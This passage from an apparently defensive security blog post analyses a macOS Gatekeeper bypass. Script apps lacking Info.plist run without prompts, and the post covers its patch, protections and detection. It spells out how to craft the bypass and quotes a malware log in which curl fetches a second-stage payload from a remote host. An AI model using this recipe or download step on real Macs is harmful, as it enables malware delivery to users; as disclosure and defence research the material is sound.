</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">3</span><span>...
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">4</span><span>
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">5</span><span>[evalResult setAllowed:sign_extend_64(r12)];</span></span></code></pre></div>
<p>This is the confirmation that the policy engine is indeed allowing our unsigned, unnotarized proof of concept application!</p>
<p>In a debugger we can introspect this <code>EvalutionResult</code> object, which (as its name implies) represents the system&rsquo;s policy evaluation result of our <code>PoC.app</code>:</p>
<p>First note that before the call to <code>setAllowed</code>, all numeric values in the object are 0 (false):</p>
<div style="border: 1px solid gray; border-radius: 4px; padding-left:25px; padding-right:25px; overflow-wrap: break-word; background-color:#2A2E35; color:lime;">
    <pre style="font-size: 18px;">

(lldb) po [$rdi className]
EvaluationResult

(lldb) po $rdi
EvalResult: 0,0,0,0 - /Users/patrick/Downloads/PoC.app/Contents/MacOS/PoC

</pre>
</div>
<p>After the call to  <code>setAllowed</code> (and to <code>setCacheResult</code>), the <code>EvaluationResult</code> object is updated:</p>
<div style="border: 1px solid gray; border-radius: 4px; padding-left:25px; padding-right:25px; overflow-wrap: break-word; background-color:#2A2E35; color:lime;">
    <pre style="font-size: 18px;">

(lldb) po [$rdi className]
EvaluationResult

(lldb) po $rdi
EvalResult: 1,1,0,0 - /Users/patrick/Downloads/PoC.app/Contents/MacOS/PoC

(lldb) p (BOOL)[$rdi allowed]
(BOOL) $83 = YES

(lldb) p (BOOL)[$rdi wouldPrompt]
(BOOL) $82 = NO

(lldb) p (BOOL)[$rdi didPrompt]
(BOOL) $84 = NO

(lldb) po [$rdi evaluationTargetPath]
/Users/patrick/Downloads/PoC.app/Contents/MacOS/PoC

</pre>
</div>
<p>Note that the <code>allowed</code> instance variable is set to 1 (YES/true), while <code>wouldPrompt</code> and <code>didPrompt</code> are both set to 0 (NO/false) &hellip;as a result the system decided that no prompt was needed!</p>
<p>Once the evaluation has completed (though no prompt was shown), the completion block (initial pass to the <code>evaluateCodeForUser:withPID:withProcessPath: ... withCompletionCallback:</code> method) is invoked.</p>
<p>The completion callback block first invokes the <code>EvaluationResult</code>&rsquo;s <code>allowed</code> method to see if the the evaluation was allowed.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-ObjC" data-lang="ObjC"><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1</span><span><span style="color:#66d9ef">if</span> ([rax allowed] <span style="color:#f92672">!=</span> <span style="color:#ae81ff">0x0</span>) <span style="color:#66d9ef">goto</span> wasAllowed;</span></span></code></pre></div>
<p>Note that if evaluation resulted in not allowed, the following code path is taken, which (as expected) terminates the suspended process:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-ObjC" data-lang="ObjC"><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1</span><span><span style="color:#75715e">//not allowed logic
</span></span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">2</span><span><span style="color:#75715e"></span>
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">3</span><span>...
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">4</span><span>os_log_error_impl(__mh_execute_header, rsi, <span style="color:#ae81ff">0x10</span>, <span style="color:#e6db74">&#34;Terminating process due to Gatekeeper rejection: %d, %@&#34;</span>, <span style="color:#f92672">&amp;</span>var_20, <span style="color:#ae81ff">0x12</span>);
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">5</span><span>
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">6</span><span>terminate_with_reason(<span style="color:#f92672">*</span>(int32_t <span style="color:#f92672">*</span>)(r13 <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x48</span>), <span style="color:#ae81ff">0x9</span>, <span style="color:#ae81ff">0x8</span>, <span style="color:#e6db74">&#34;Gatekeeper policy blocked execution&#34;</span>, <span style="color:#ae81ff">0x41</span>);</span></span></code></pre></div>
<p>For example, running the &ldquo;normal&rdquo; script-based application (<code>Script.app</code>) which is blocked, triggers this call after the alert is shown:</p>
<div style="border: 1px solid gray; border-radius: 4px; padding-left:25px; padding-right:25px; overflow-wrap: break-word; background-color:#2A2E35; color:lime;">
    <pre style="font-size: 18px;">

(lldb)  
Process 138 stopped
->  0x10595b514 <+183>: callq  0x1059adc84   ; symbol stub for: terminate_with_reason

(lldb) po $rdi
7938

(lldb) x/s $rcx
0x1059c4b4c: "Gatekeeper policy blocked execution"

</pre>
</div>
<p>In the above debugger output, the first argument (<code>7938</code> passed in via the <code>RDI</code> register), is the process id for the process to terminated. For example, the <code>Script.app</code> (albeit run via <code>/bin/sh</code>):</p>
<div style="border: 1px solid gray; border-radius: 4px; padding-left:25px; padding-right:25px; overflow-wrap: break-word; background-color:#2A2E35; color:lime;">
    <pre style="font-size: 18px;">
% ps -p 7938
PID  CMD
7938 /bin/sh /private/var/folders/pw/sv96s36d0qgc_6jh45jqmrmr0000gn/T/AppTranslocation/3FF7B408-AC64-4636-AA06-89E059307032/d/Script.app/Contents/MacOS/Script

</pre>
</div>
<p>However, as our proof of concept was allowed(!), we take the jump, and invoke the <code>ExecManagerService</code>&rsquo;s <code>sendEvaluationResult:forEvaluationID:</code> passing in the <code>EvaluationResult</code> object and an evaluation ID (in this instance the value is 599).</p>
<p>Interestingly, the <code>sendEvaluationResult:forEvaluationID:</code> calls into the kernel via an <code>IOConnectCallMethod</code> call!</p>
<p>Stepping over this the <code>IOConnectCallMethod</code> calls results in two things</p>
<ol>
<li>The suspended process under evaluation (e.g. our proof of concept application) is resumed.</li>
<li>The following messages are logged:
<pre tabindex="0"><code>kernel: (AppleSystemPolicy) Waking up reference: 599
kernel: (AppleSystemPolicy) Thread waiting on reference 599 woke up
kernel: (AppleSystemPolicy) evaluation result: 599, allowed, cache, 1618125792
</code></pre></li>
</ol>
<p>The log messages contain the evaluation ID (599), and indicate the suspended evaluee process (main thread?) was woken up and allowed (to resume). This means our PoC is finally free to merrily go on its way!</p>
<p>The kernel extension (kext) that generates these log messages is <code>AppleSystemPolicy.kext</code>. As noted by Scott Knight, this is &ldquo;the &hellip;client of the <code>syspolicyd</code> MIG service&rdquo;. In other words, it interacts w/ <code>syspolicyd</code> for example waiting on evaluations and resuming (allowed) processes.</p>
<p>Looking for cross-references to such log messages as well as dumping symbols and method names provides insight into <code>AppleSystemPolicy.kext</code></p>
<div style="border: 1px solid gray; border-radius: 4px; padding-left:25px; padding-right:25px; overflow-wrap: break-word; background-color:#2A2E35; color:lime;">
    <pre style="font-size: 18px;">
% nm -C /System/Library/Extensions/AppleSystemPolicy.kext/Contents/MacOS/AppleSystemPolicy

WAITING_ON_APPROVAL_FROM_SYSPOLICYD__(syspolicyd_evaluation*)
REVOKED_PROCESS_WAITING_ON_TERMINATION__(lck_mtx_t*)

AppleSystemPolicy::waitForEvaluation(syspolicyd_evaluation*, int, ASPEvaluationInfo*, vnode**, ScanMeta*, ...);
AppleSystemPolicy::procNotifyExecComplete(proc*);
ASPEvaluationManager::waitOnEvaluation(syspolicyd_evaluation*);
ASPEvaluationManager::wakeupEvaluationByID(long long, syspolicyd_evaluation_results*);

</pre>
</div>
<p>Further discussion of this kext is outside the scope of the blog post (and is not relevant to the underlying bug).</p>
<div class="note">
For more information on the AppleSystemPolicy kext, see:
<br>
<br>
<center>
  "<a href="https://knight.sc/reverse%20engineering/2019/02/20/syspolicyd-internals.html" class="inlineLink">syspolicyd internals</a>".
</center>
</div>
<h3 id="a-recap">A Recap</h3>
<p>If you&rsquo;ve made it this far, kudos! Spelunking through macOS&rsquo;s system policy engine is no easy task! Before we dive into in-the wild exploitation, and protections &amp; detections, let&rsquo;s briefly recap the bug. In a sentence:</p>
<p>Any script-based application that does <em>not</em> contain an <code>Info.plist</code> file will be misclassified as &ldquo;not a bundle&rdquo; and thus will be allowed to execute with no alerts nor prompts.</p>
<p>Let&rsquo;s break this down piece by piece:</p>
<ol>
<li>A script-based application is an application whose main executable component is a (bash/python/etc) script.
It is imperative that it is a script, for several reasons. First, if the main executable component is a mach-O binary unless it is fully notarized, it will (still) be rejected (blocked) by the system, as mach-O binaries are always checked. And even if the mach-O binary is notarized it will result in the File Quarantine, &ldquo;&hellip;is an application &hellip;are you sure you want to open it&rdquo; prompt.</li>
</ol>
<p>A script-based application is executed (as we saw) via the shell, <code>/bin/sh</code> which is a trusted, platform binary. Normally though script-based applications are also blocked (unless the entire bundle is signed and notarized). However due to the bug this is not the case, meaning the script&rsquo;s contents (commands) are allowed.</p>
<ol start="2">
<li>
<p>An application that does not contain an <code>Info.plist</code> file.
This is similarly imperative as even &ldquo;normal&rdquo; script-based applications are subjected to policy checks. If a script-based application contains an <code>Info.plist</code> file, it will be (correctly) classified as a bundle, and as such will be blocked (unless the entire bundle is signed and notarized). And even in the case when it is signed and notarized, a File Quarantine prompt will be shown that requires explicit user approval.</p>
</li>
<li>
<p>A script-based application without an <code>Info.plist</code> file will be misclassified as &ldquo;not a bundle&rdquo;. This results in an evaluation type of 0x2, which causes logic in the system policy engine to both skip showing any prompts or alerts and explicitly setting an <code>allowed</code> flag to true.</p>
</li>
</ol>
<p>End result, such an application, though unsigned, unnotarized, and quarantined, is allowed to execute without a single alert! ü•≤</p>
<h3 id="in-the-wild">In the Wild</h3>
<p>With a solid understanding of the flaw, I reached out to my good friends at <a href="https://www.jamf.com/?utm_source=objective-see&amp;utm_medium=sponsored-link&amp;utm_campaign=next-gen-security&amp;utm_content=2021-02-05_protect">Jamf</a>, and simply inquired if they had seen any script-based malware packaged up in application bundles. While we&rsquo;ve seen malware in the past shipped as scripts in <strong>normal</strong> application bundles (i.e. with an <code>Info.plist</code> file) I was skeptical we&rsquo;d find any exploiting this specific flaw.</p>
<p>Jamf (via their <a href="https://www.jamf.com/?utm_source=objective-see&amp;utm_medium=sponsored-link&amp;utm_campaign=next-gen-security&amp;utm_content=2021-02-05_protect">Jamf Protect</a> product), already flags script-based malware that&rsquo;s packaged up in an application bundles, simply, as we noted, such malware (in <strong>normal</strong> application bundles) is rather common.</p>
<p>Well, turns out they were able to confirm via <a href="https://www.jamf.com/?utm_source=objective-see&amp;utm_medium=sponsored-link&amp;utm_campaign=next-gen-security&amp;utm_content=2021-02-05_protect">Jamf Protect</a> there was a new variant of malware that was uniquely packaged as a bare-boned script based application.&quot;</p>
<img src="../images/blog/blog_0x64/malware.png"  width="100%" class="center" style="border-radius: 4px;">

<center style="color:#787878; padding-top:5px;">A bare-boned script-based application, found it the wild!</center>

<p>In other words, there&rsquo;s malware exploiting this exact flaw &hellip;as an 0day &hellip;in the wild. Yikes!</p>
<div class="note">
You can read more about the discovery and analysis of malware in their excellent writeup:
<br>
<br>
<center>
  <a href="https://www.jamf.com/blog/shlayer-malware-abusing-gatekeeper-bypass-on-macos/" class="inlineLink">"Shlayer Malware Abusing Gatekeeper Bypass On Macos"</a>
</center>
</div>
<p>As shown below, though unsigned (and unnotarized) the malware (<code>1302.app/Contents/MacOS/1302</code>) is able to run (and download &amp; execute 2nd-stage payloads), bypassing all File Quarantine, Gatekeeper, and Notarization requirements:</p>
<p><div style="border: 1px solid gray; border-radius: 4px; padding-left:25px; padding-right:25px; overflow-wrap: break-word; background-color:#2A2E35; color:lime;">
    <pre style="font-size: 18px;">
# ProcessMonitor.app/Contents/MacOS/ProcessMonitor -pretty
...

{
  "event" : "ES_EVENT_TYPE_NOTIFY_EXEC",
  "process" : {
    "arguments" : [
      "/bin/bash",
      "/private/var/folders/zg/lhlpqsq14lz_ddcq3vx0r5xm0000gn/T
        /AppTranslocation/E486DA04-D4EC-41C4-8250-F587586DA4F7/d
        /1302.app/Contents/MacOS/1302"
    ],
    "name" : "bash",
    "pid" : 770
  }
}
{
  "event" : "ES_EVENT_TYPE_NOTIFY_EXEC",
  "process" : {
    "arguments" : [
      "curl",
      "-L",
      "https://bbuseruploads.s3.amazonaws.com/
       c237a8d2-0423-4819-8ddf-492e6852c6f7/downloads/
       c9a2dac9-382a-42f6-873b-8bf8d5beafe5/d9o"
    ],
    "ppid" : 884,
    "name" : "curl",
    "pid" : 885
  }
}
</pre>
</div>
<br></p>
<div class="note">
Once off and running, the malware can manually remove the quarantine attribute from any subsequent payloads or components it downloads. Thus, such items will not be subjected to the aforementioned security checks (notarization, etc.).
</div>
<br>
<p>Luckily as discussed below, <a href="https://www.objective-see.com/products/blockblock.html">BlockBlock</a> with &ldquo;Notarized Mode&rdquo; enabled, generically blocks this threat:</p>
<img src="../images/blog/blog_0x64/blocked.png"  width="100%" class="center" style="border-radius: 4px;">

<center style="color:#787878; padding-top:5px;">BlockBlock, block blocking!</center>

<h3 id="the-patch">The Patch</h3>
<p>Apple fixed this bug in macOS 11.3. How? Well recall that the core flaw is in the misclassification of a bare-boned script-based application as &ldquo;not a bundle&rdquo;. As normal script-based application (i.e. ones with an <code>Info.plist</code> file) are classified as a bundle, and trigger the correct alerting/prompting/blocking logic, it seemed reasonable to assume that Apple would address the flaw simply in the bundle classification logic.</p>
<p>&hellip;and this appears to be exactly the case.</p>
<p>Though the bundle classification logic is located in an unnamed subroutine, it&rsquo;s trivial to locate it in the new macOS 11.3 <code>syspolicyd</code> binary. We simply look for cross-references to unique strings (e.g. <code>Versions/Current/Resources/Info.plist</code>) that are found in the unnamed subroutine in the 11.2 version of <code>syspolicyd</code>.</p>
<p>Once we locate the &ldquo;same&rdquo; subroutine in 11.3, we first notice it has been greatly expanded. In fact, the number of code blocks (that indicate control flow decisions) has expanded from 26 up to 35. Clearly, additional checks were added. Though we won&rsquo;t comprehensively deconstruct the entire (updated) algorithm, via static analysis, we can point out some relevant new checks that are responsible for (now) correctly classifying even applications that don&rsquo;t have <code>Info.plist</code> files!</p>
<p>First (and most significantly) there is now a check for a path extension of <code>.app</code> &hellip;and any item with said extension, will now be correctly classified as a bundle:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-ObjC" data-lang="ObjC"><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1</span><span>pathExtension <span style="color:#f92672">=</span> [[component pathExtension] lowercaseString];
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">2</span><span>isBundle <span style="color:#f92672">=</span> [rax isEqualToString:<span style="color:#e6db74">@&#34;app&#34;</span>];</span></span></code></pre></div>
<p>This is important, as this is essentially the only check Finder performs when kicking off the launch of an application. (Recall we created a folder named <code>foo.app</code> double-clicked it, and observed Finder attempting to launch it).</p>
<p>Also, even if the item does not contain a path component of <code>.app</code>, the new code now checks for presence of <code>Contents/MacOS</code>:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-ObjC" data-lang="ObjC"><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1</span><span>bundle <span style="color:#f92672">=</span> [component URLByAppendingPathComponent:<span style="color:#e6db74">@&#34;Contents/MacOS&#34;</span>];
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">2</span><span>isBundle <span style="color:#f92672">=</span> doesFileExist(bundle.path);</span></span></code></pre></div>
<p>My guess is macOS likely requires (any, even non-application) bundles to conform to this structure for functionality reasons. This is makes sense that the &ldquo;<em>is a bundle</em>&rdquo; classification algorithm also now checks for structure as well.</p>
<p>The improved algorithm now correctly classifies our bare-bones script-based PoC application as a bundle. This means it&rsquo;s now subjected to code paths within <code>syspolicyd</code> that will both display an alert to the user as well as block the application from running (as it is not notarized).</p>
<img src="../images/blog/blog_0x64/patched.png"  width="" class="center" style="border-radius: 4px;">

<center style="color:#787878; padding-top:5px;">(correctly) blocked on macOS 11.3</center>

<p>Was this all that was required? It appears so, as a (very) brief triage of other logic within the <code>syspolicyd</code> code, did not reveal any notable changes.</p>
<h3 id="protections">Protections:</h3>
<p>First and foremost the best way to patch against this nasty bug and protect oneself from malware that is currently exploiting it, is to update to macOS 11.3. Like now! Go do it!</p>
<p>Luckily, if you were running a recent version of <a href="https://www.objective-see.com/products/blockblock.html">BlockBlock</a> (with &ldquo;Notarization Mode&rdquo; enabled), you were already protected! üôåüèΩ</p>
<p>Version 2.0 of BlockBlock brought a host of improvements, such as native M1 compatibility. Most relevant in the context of today&rsquo;s blog post though, was the introduction of &ldquo;Notarization Mode&rdquo;:</p>
<img src="../images/blog/blog_0x64/bbPrefs.png"  width="75%" class="center" style="border-radius: 4px;">

<center style="color:#787878; padding-top:5px;">BlockBlock&#39;s Preferences (including Notarization Mode)</center>

<p>The idea is simple: regardless of the system policy setting (or presence of bugs), BlockBlock examines launched processes (and scripts), and alerts on those that are not notarized. By design there are a few caveats including the fact that BlockBlock only examines user-launched applications, that have been downloaded from the Internet.</p>
<p>Let&rsquo;s delve into BlockBlock logic a bit more here:</p>
<ol>
<li>By means of the Endpoint Security Framework, BlockBlock registers an authentication callback (<code>ES_EVENT_TYPE_AUTH_EXEC</code>) for any new processes:</li>
</ol>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-ObjC" data-lang="ObjC"><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1</span><span><span style="color:#75715e">//endpoint (process) client
</span></span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2</span><span><span style="color:#75715e"></span><span style="color:#66d9ef">@property</span> es_client_t<span style="color:#f92672">*</span> endpointProcessClient;
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3</span><span>
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4</span><span>...
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 5</span><span>
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 6</span><span><span style="color:#75715e">//events
</span></span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 7</span><span><span style="color:#75715e"></span>es_event_type_t procEvents[] <span style="color:#f92672">=</span> {ES_EVENT_TYPE_AUTH_EXEC};
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 8</span><span>
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 9</span><span><span style="color:#75715e">//new client
</span></span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10</span><span><span style="color:#75715e">// callback will process `ES_EVENT_TYPE_AUTH_EXEC` events
</span></span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">11</span><span><span style="color:#75715e"></span>es_new_client(<span style="color:#f92672">&amp;</span>endpointProcessClient, <span style="color:#f92672">^</span>(es_client_t <span style="color:#f92672">*</span>client, <span style="color:#66d9ef">const</span> es_message_t <span style="color:#f92672">*</span>message)
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">12</span><span>{
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">13</span><span>  <span style="color:#75715e">//TODO process event
</span></span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">14</span><span><span style="color:#75715e"></span>}
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">15</span><span>
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">16</span><span><span style="color:#75715e">//subscribe
</span></span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">17</span><span><span style="color:#75715e"></span>es_subscribe(endpointProcessClient, procEvents, <span style="color:#66d9ef">sizeof</span>(events)<span style="color:#f92672">/</span><span style="color:#66d9ef">sizeof</span>(procEvents[<span style="color:#ae81ff">0</span>]))</span></span></code></pre></div>
<ol start="2">
<li>When a <code>ES_EVENT_TYPE_AUTH_EXEC</code> event occurs (i.e. when a process has been launched, but before it is allowed to execute), BlockBlock examines either the process, or if it&rsquo;s a process executing a script (e.g. <code>/bin/sh</code>) the script. Specifically after confirming the item (process or script) is running from a translocated location (which means it&rsquo;s been quarantined, and launched by the user), it checks if it&rsquo;s been notarized.</li>
</ol>
<p>To check if an item has been translocated, one can invoke the private <code>SecTranslocateIsTranslocatedURL</code> API. Whereas to check if an item is notarized, invoke the <code>SecStaticCodeCheckValidity</code> API with a <code>SecRequirementRef</code> set to &ldquo;notarized&rdquo;:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-ObjC" data-lang="ObjC"><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1</span><span>SecStaticCodeRef staticCode <span style="color:#f92672">=</span> NULL;
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">2</span><span><span style="color:#66d9ef">static</span> SecRequirementRef isNotarized <span style="color:#f92672">=</span> nil;
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">3</span><span>
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">4</span><span>SecStaticCodeCreateWithPath(itemPath, kSecCSDefaultFlags, <span style="color:#f92672">&amp;</span>staticCode);
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">5</span><span>SecRequirementCreateWithString(CFSTR(<span style="color:#e6db74">&#34;notarized&#34;</span>), kSecCSDefaultFlags, <span style="color:#f92672">&amp;</span>isNotarized);
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">6</span><span>
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">7</span><span>SecStaticCodeCheckValidity(staticCode, kSecCSDefaultFlags, isNotarized);</span></span></code></pre></div>
<ol start="3">
<li>If the item being launched is translocated and non-notarized, BlockBlock will alert the user, giving them the option to confirm or allow. For example, here&rsquo;s the detection and alert when attempting to run our PoC application:</li>
</ol>
<img src="../images/blog/blog_0x64/bb.png"  width="100%" class="center" style="border-radius: 4px;">

<center style="color:#787878; padding-top:5px;">BlockBlock, block blocking!</center>

<p>In the above alert, though macOS (inadvertently) will allow the script to run, BlockBlock has detected it is non-notarized script, and thus should (likely) be blocked. Though of course, the user is given the option to allow.</p>
<div class="note">
<p>To learn more about, or to install BlockBlock, hop over to its page: <a href="https://objective-see.com/products/blockblock.html" class="inlineLink">BlockBlock</a>. It&rsquo;s 100% free!</p>
<p>BlockBlock is also fully open-source, so you can peruse its source code as well: <a href="https://github.com/objective-see/BlockBlock" class="inlineLink">Source Code</a>.</p>
</div>
<h3 id="detections">Detections</h3>
<br>
<div class="note">
I've written a proof of concept Python script to scan for (past) exploitation attempts:
<br>
<br>
<center>
<a href="https://objective-see.com/downloads/blog/blog_0x64/scan.py" class="inlineLink">scan.py</a>  
</center>
</div>
<p>What about (past) detections?</p>
<p>As it appears that this bug has been around since macOS 10.15 (2019), I thought it might be interesting to explore some ideas of detecting past abuses (&hellip;for example malware exploiting it in the wild).</p>
<p>First, recall that we ran three different applications and analyzed their log messages as an initial step in attempting to (somewhat) pinpoint the bug&rsquo;s location. For the PoC application (and only for the PoC application), after its (Gatekeeper) evaluation, we saw the following log message:</p>
<p>&ldquo;<code>syspolicyd: [com.apple.syspolicy.exec:default] Updating flags: /Users/patrick/Downloads/PoC.app/Contents/MacOS/PoC, 512</code>&rdquo;</p>
<p>This log message is printed as part of the code path that (inadvertently) allowed the unsigned, unnotarized PoC application:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-ObjC" data-lang="ObjC"><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1</span><span>os_log_impl(__mh_execute_header, r15, <span style="color:#ae81ff">0x1</span>, <span style="color:#e6db74">&#34;Updating flags: %@, %lu&#34;</span>, <span style="color:#f92672">&amp;</span>var_70, <span style="color:#ae81ff">0x16</span>);
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">2</span><span>     
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">3</span><span>
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">4</span><span>[<span style="color:#f92672">*</span>(var_E8 <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x8</span>) updateFlags:rbx forTarget:var_A0];</span></span></code></pre></div>
<p>As shown in the above code, immediately after the message is logged, <code>syspolicyd</code> invokes a method named <code>updateFlags: forTarget:</code>.</p>
<p>This method belongs to the <code>ExecManagerDatabase</code> call, and is invoked with the flags and the <code>PolicyScanTarget</code> object representing the evaluee.</p>
<p>Triaging the <code>ExecManagerDatabase</code>&rsquo;s <code>updateFlags: forTarget:</code> method reveals an SQL update statement:
<code>@&quot;UPDATE policy_scan_cache SET flags = ?1 WHERE volume_uuid = ?2 AND object_id = ?3 AND fs_type_name = ?4&quot;;</code></p>
<p>&hellip;and a call into an <code>executeQuery: withBind: withResults</code> method (that executes the SQL query via various <code>sqlite3_*</code> APIs).</p>
<p>In order to find out what database is updated we can run a file monitor such as macOS&rsquo;s built-in <code>fs_usage</code> utility:</p>
<div style="border: 1px solid gray; border-radius: 4px; padding-left:25px; padding-right:25px; overflow-wrap: break-word; background-color:#2A2E35; color:lime;">
    <pre style="font-size: 18px;">

# fs_usage -w -f filesystem | grep syspolicyd 

...
RdData[S]  D=0x052fdb4a  B=0x1000  /dev/disk1s1 /private/var/db/SystemPolicyConfiguration/ExecPolicy-wal  syspolicyd.55183      

# file /private/var/db/SystemPolicyConfiguration/ExecPolicy*
/private/var/db/SystemPolicyConfiguration/ExecPolicy: SQLite 3.x database
/private/var/db/SystemPolicyConfiguration/ExecPolicy-shm: data
/private/var/db/SystemPolicyConfiguration/ExecPolicy-wal: SQLite Write-Ahead Log

</pre>
</div>
<p>This reveals an aptly-named database being updated:  <code>/private/var/db/SystemPolicyConfiguration/ExecPolicy</code></p>
<p>If we take a peek at the undocumented <code>policy_scan_cache</code> table in this <code>ExecPolicy</code> database, we can see evaluation results &hellip;of many (every?) item that has been scanned!</p>
<img src="../images/blog/blog_0x64/db.png"  width="100%" class="center" style="border-radius: 4px;">

<center style="color:#787878; padding-top:5px;">Evaluated items in the policy_scan_cache table</center>

<p>Unfortunately the data in the <code>policy_scan_cache</code> table does not contain the path to the evaluated item. However, it turns out the <code>object_id</code> column contains the inode of the item (on the volume identified in the <code>volume_uuid</code> column).</p>
<p>We can confirm this by looking for our <code>PoC.app</code>. First, we get its inode (via the <code>stat</code> command):</p>
<div style="border: 1px solid gray; border-radius: 4px; padding-left:25px; padding-right:25px; overflow-wrap: break-word; background-color:#2A2E35; color:lime;">
    <pre style="font-size: 18px;">

% stat ~/Downloads/PoC.app/Contents/MacOS/PoC 
16777220 121493800  ... /Users/patrick/Downloads/PoC.app/Contents/MacOS/PoC

</pre>
</div>
<p>Armed with its inode (<code>121493800</code>), let&rsquo;s query the <code>ExecPolicy</code> database:</p>
